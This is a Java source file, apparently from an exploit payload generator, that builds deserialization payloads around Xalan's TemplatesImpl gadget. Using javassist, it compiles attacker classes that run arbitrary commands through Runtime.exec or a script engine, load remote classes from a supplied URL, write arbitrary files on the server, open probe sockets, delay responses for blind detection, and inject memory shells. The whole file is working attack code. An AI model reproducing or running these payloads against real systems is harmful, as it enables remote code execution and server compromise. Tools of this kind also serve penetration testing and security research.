package com.ppp.sinks;

import com.ppp.JavaClassBuilder;
import com.ppp.JavaClassHelper;
import com.ppp.Printer;
import com.ppp.middleware.builder.JavaClassModifier;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.sinks.annotation.Sink;
import com.ppp.utils.*;
import com.ppp.utils.maker.CryptoUtils;
import com.ppp.utils.maker.JavaClassUtils;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtField;

import java.io.FileInputStream;
import java.io.Serializable;

/**
 * @author Whoopsunix
 */
@Sink({Sink.TemplatesImpl})
public class TemplatesImpl {
    /**
     * 命令执行
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.Command, EnchantType.DEFAULT})
    public Object runtime(SinksHelper sinksHelper) throws Exception {
        String className = "RuntimeD";
        String command = sinksHelper.getCommand();
        EnchantEnums commandType = sinksHelper.getCommandType();
        String code = sinksHelper.getCode();
        String codeFile = sinksHelper.getCodeFile();
        boolean split = sinksHelper.isSplit();

        Printer.blueInfo("command type: " + commandType);
        Printer.yellowInfo("command: " + command);

        ClassPool pool = ClassPool.getDefault();
        pool.importPackage("javax.script");

        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);

        switch (commandType) {
            default:
            case Runtime:
                if (split) {
                    ctConstructor.setBody(String.format("{Runtime.getRuntime().exec(new String[]{%s});}", CommandUtils.splitCommandComma(command)));
                } else {
                    ctConstructor.setBody("{Runtime.getRuntime().exec(\"" + command + "\");}");
                }
            case ScriptEngine:
                if (codeFile != null) {
                    try {

                        FileInputStream fileInputStream = new FileInputStream(codeFile);
                        byte[] codeBytes = new byte[fileInputStream.available()];
                        fileInputStream.read(codeBytes);
                        fileInputStream.close();
                        code = new String(codeBytes);
                    } catch (Exception e) {
                        Printer.warn("File read error");
                    }
                } else if (code == null) {
                    if (split) {
                        code = String.format("x=new java.lang.ProcessBuilder;x.command(%s);x.start();", CommandUtils.splitCommandComma(command));
                    } else {
                        code = String.format("java.lang.Runtime.getRuntime().exec('%s');", command);
                    }
                }

                Printer.yellowInfo("code: " + code);
                String eval = String.format("{ScriptEngineManager manager = new ScriptEngineManager();ScriptEngine engine = manager.getEngineByName(\"js\");String code = \"%s\";engine.eval(code);}", code);
                ctConstructor.setBody(eval);
        }


        ctClass.addConstructor(ctConstructor);

        // 设置 serialVersionUID
        JavaClassUtils.fieldChangeIfExist(ctClass, "serialVersionUID", "private static final long serialVersionUID = 8207363842866235160L;");

        // CtClass 增强
        JavaClassModifier.ctClassBuilderNew(null, ctClass, sinksHelper.getJavaClassHelper());
        byte[] bytes = JavaClassModifier.toBytes(ctClass);
        return createTemplatesImpl(bytes);
    }

    /**
     * 线程延时
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.Delay})
    public Object delay(SinksHelper sinksHelper) throws Exception {
        String className = "DelayD";

        Long delayTime = sinksHelper.getDelayTime();
        EnchantEnums delay = sinksHelper.getDelay();
        Printer.yellowInfo(String.format("System will delay response for %s seconds", delayTime));

        String code;
        ClassPool pool = ClassPool.getDefault();
        if (delay != null && delay.equals(EnchantEnums.Timeunit)) {
            delayTime *= 1000L;
            code = "java.lang.Thread.sleep((long)" + delayTime + ");";
        } else {
            code = "java.util.concurrent.TimeUnit.SECONDS.sleep((long)" + delayTime + ");";
        }
        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody(code);
        ctClass.addConstructor(ctConstructor);


        // CtClass 增强
        JavaClassModifier.ctClassBuilderNew(null, ctClass, sinksHelper.getJavaClassHelper());
        byte[] bytes = JavaClassModifier.toBytes(ctClass);
        return createTemplatesImpl(bytes);
    }

    /**
     * Socket 探测
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.Socket})
    public Object socket(SinksHelper sinksHelper) throws Exception {
        String className = "SocketD";

        String thost = sinksHelper.getHost();
        Printer.yellowInfo("System will initiate a socket request to " + thost);

        String[] hostSplit = thost.split("[:]");
        String host = hostSplit[0];
        int port = 80;
        if (hostSplit.length == 2)
            port = Integer.parseInt(hostSplit[1]);

        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass(className);
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        ctConstructor.setBody(String.format("new java.net.Socket(\"%s\", %d);", host, port));
        ctClass.addConstructor(ctConstructor);

        // CtClass 增强
        JavaClassModifier.ctClassBuilderNew(null, ctClass, sinksHelper.getJavaClassHelper());
        byte[] bytes = JavaClassModifier.toBytes(ctClass);
        return createTemplatesImpl(bytes);
    }

    /**
     * 远程类加载
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.RemoteLoad})
    public Object remoteLoad(SinksHelper sinksHelper) throws Exception {
        String className = "RemoteLoadD";

        String url = sinksHelper.getUrl();
        String remoteClassName = sinksHelper.getClassName();
        Object constructor = sinksHelper.getConstructor();
        Printer.yellowInfo("Remote url: " + url);
        Printer.yellowInfo("Remote class name: " + remoteClassName);


        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = null;

        if (constructor != null) {
            Printer.yellowInfo("Remote class constructor param: " + constructor);
            // 转为 Integer
            try {
                constructor = Integer.parseInt(constructor.toString());
            } catch (Exception e) {
            }
            Class constructorType = constructor.getClass();

            ctClass = pool.get(RemoteLoadD.class.getName());
            JavaClassUtils.fieldChangeIfExist(ctClass, "url", String.format("private static String url = \"%s\";", url));
            JavaClassUtils.fieldChangeIfExist(ctClass, "className", String.format("private static String className = \"%s\";", remoteClassName));

            if (constructor instanceof Integer) {
                JavaClassUtils.fieldChangeIfExist(ctClass, "param", String.format("private static Object param = new Integer(%s);", constructor));
            } else if (constructor instanceof String) {
                JavaClassUtils.fieldChangeIfExist(ctClass, "param", String.format("private static Object param = \"%s\";", constructor));
            }

        } else {
            ctClass = pool.makeClass(className);
            CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
            String code = String.format("{java.net.URL url = new java.net.URL(\"%s\");\n" +
                    "        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});\n" +
                    "        Class loadedClass = classLoader.loadClass(\"%s\");\n" +
                    "        Object object = loadedClass.getConstructor(null).newInstance(null);}", url, remoteClassName);
            ctConstructor.setBody(code);
            ctClass.addConstructor(ctConstructor);
        }


        // CtClass 增强
        JavaClassModifier.ctClassBuilderNew(null, ctClass, sinksHelper.getJavaClassHelper());
        byte[] bytes = JavaClassModifier.toBytes(ctClass);
        return createTemplatesImpl(bytes);
    }

    /**
     * 文件写入
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.FileWrite})
    public Object fileWrite(SinksHelper sinksHelper) throws Exception {
        String className = "FileWriteD";

        String serverFilePath = sinksHelper.getServerFilePath();
        String localFilePath = sinksHelper.getLocalFilePath();
        String fileContent = sinksHelper.getFileContent();
        byte[] fileBytes = sinksHelper.getFileBytes();
        boolean split = sinksHelper.isSplit();
        boolean append = sinksHelper.isAppend();


        Printer.yellowInfo("Server file path: " + serverFilePath);

        byte[] contentBytes = new byte[]{};

        if (fileBytes != null) {
            contentBytes = fileBytes;
        } else {
            if (localFilePath != null) {
                Printer.yellowInfo("Local file path: " + localFilePath);
                try {
                    contentBytes = FileUtils.fileRead(localFilePath);
                    Printer.warn(String.format("File content length: %s, if too large, please use -split option", contentBytes.length));
                    if (split) {
                        int partSize = sinksHelper.getPartSize();
                        Printer.blueInfo("File will be split into " + partSize + "kb parts");
                        sinksHelper.setFileParts(FileUtils.splitFile(localFilePath, partSize));
                        sinksHelper.setLoop(true);
                        return null;
                    }
                } catch (Exception e) {
                    Printer.error("File read error");
                }
            } else if (fileContent != null) {
                Printer.yellowInfo("File content: " + fileContent);
                contentBytes = fileContent.getBytes();
            }
        }

//        if (localFilePath != null) {
//            Printer.yellowInfo("Local file path: " + localFilePath);
//            try {
//                FileInputStream fileInputStream = new FileInputStream(localFilePath);
//                contentBytes = new byte[fileInputStream.available()];
//                fileInputStream.read(contentBytes);
//                fileInputStream.close();
//            } catch (Exception e) {
//                Printer.error("File read error");
//            }
//        } else if (fileContent != null) {
//            Printer.yellowInfo("File content: " + fileContent);
//            contentBytes = fileContent.getBytes();
//        }

        String b64 = CryptoUtils.base64encoder(contentBytes);

        ClassPool pool = ClassPool.getDefault();

//        CtClass ctClass;
//        try {
//            ctClass = pool.getCtClass(className);
//        }catch (Exception e){
//            ctClass = pool.makeClass(className);
//        }
        CtClass ctClass = pool.makeClass(RanDomUtils.generateRandomOnlyString(6));
        ctClass.defrost();
        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
        if (append) {
            Printer.blueInfo("bytes will be written to the end of the file");
            ctConstructor.setBody(String.format("{String b = \"%s\";\n" +
                    "        byte[] bytes = null;\n" +
                    "        try{\n" +
                    "            bytes = java.util.Base64.getDecoder().decode(b);\n" +
                    "        }catch (Exception e){\n" +
                    "            bytes = new sun.misc.BASE64Decoder().decodeBuffer(b);\n" +
                    "        }\n" +
                    "        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"%s\", true);\n" +
                    "        fileOutputStream.write(bytes);\n" +
                    "        fileOutputStream.close();}", b64, serverFilePath));
        } else {
            ctConstructor.setBody(String.format("{String b = \"%s\";\n" +
                    "        byte[] bytes = null;\n" +
                    "        try{\n" +
                    "            bytes = java.util.Base64.getDecoder().decode(b);\n" +
                    "        }catch (Exception e){\n" +
                    "            bytes = new sun.misc.BASE64Decoder().decodeBuffer(b);\n" +
                    "        }\n" +
                    "        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"%s\");\n" +
                    "        fileOutputStream.write(bytes);\n" +
                    "        fileOutputStream.close();}", b64, serverFilePath));
        }

        ctClass.addConstructor(ctConstructor);

        // CtClass 增强
        JavaClassModifier.ctClassBuilderNew(null, ctClass, sinksHelper.getJavaClassHelper());
        byte[] bytes = JavaClassModifier.toBytes(ctClass);
        return createTemplatesImpl(bytes);
    }


    /**
     * JavaClass 增强
     * MemShell、RceEcho
     *
     * @param sinksHelper
     * @return
     * @throws Exception
     */
    @EnchantType({EnchantType.JavaClass})
    public Object javaClass(SinksHelper sinksHelper) throws Exception {
        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();

        byte[] classBytes = JavaClassBuilder.build(javaClassHelper);

        // todo
        return createTemplatesImpl(classBytes);
    }

    public static Object createTemplatesImpl(final byte[] classBytes) throws Exception {
        if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
            return createTemplatesImpl(
                    classBytes,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
        }

        return createTemplatesImpl(classBytes, com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
    }

    public static class Whoopsunix implements Serializable {
        private static final long serialVersionUID = 8207363842866235160L;
    }

    public static <T> T createTemplatesImpl(byte[] classBytes, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory)
            throws Exception {
        final T templates = tplClass.newInstance();

        byte[] pppBytes = createRandomNameClass();


        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
//                classBytes, ClassFiles.classAsBytes(Whoopsunix.class)
                classBytes, pppBytes
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "anyStr");
        // 满足条件 1. classCount也就是_bytecodes的数量大于1   2. _transletIndex >= 0  可去掉 AbstractTranslet
        Reflections.setFieldValue(templates, "_transletIndex", 0);
        // 可去掉
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    public static byte[] createRandomNameClass() throws Exception {
//        Printer.yellowInfo("_bytecodes[1] make");
        ClassPool classPool = ClassPool.getDefault();
        CtClass ctClass = classPool.makeClass("Whoopsunix");
        ctClass.addInterface(classPool.get("java.io.Serializable"));
        ctClass.addField(CtField.make("private static final long serialVersionUID = 8207363842866235160L;", ctClass));

        JavaClassHelper javaClassHelper = new JavaClassHelper();
        javaClassHelper.setRandomJavaClassName(true);
        System.setProperty(Printer.PRINT_ENABLED_PROPERTY, "false");
        JavaClassModifier.ctClassBuilderNew(null, ctClass, javaClassHelper);
        byte[] bytes = JavaClassModifier.toBytes(ctClass);
        System.setProperty(Printer.PRINT_ENABLED_PROPERTY, "true");
        return bytes;
    }

    public static void main(String[] args) {
        byte[] bytes = ClassFiles.classAsBytes(Whoopsunix.class);
        System.out.println(bytes);
    }

}
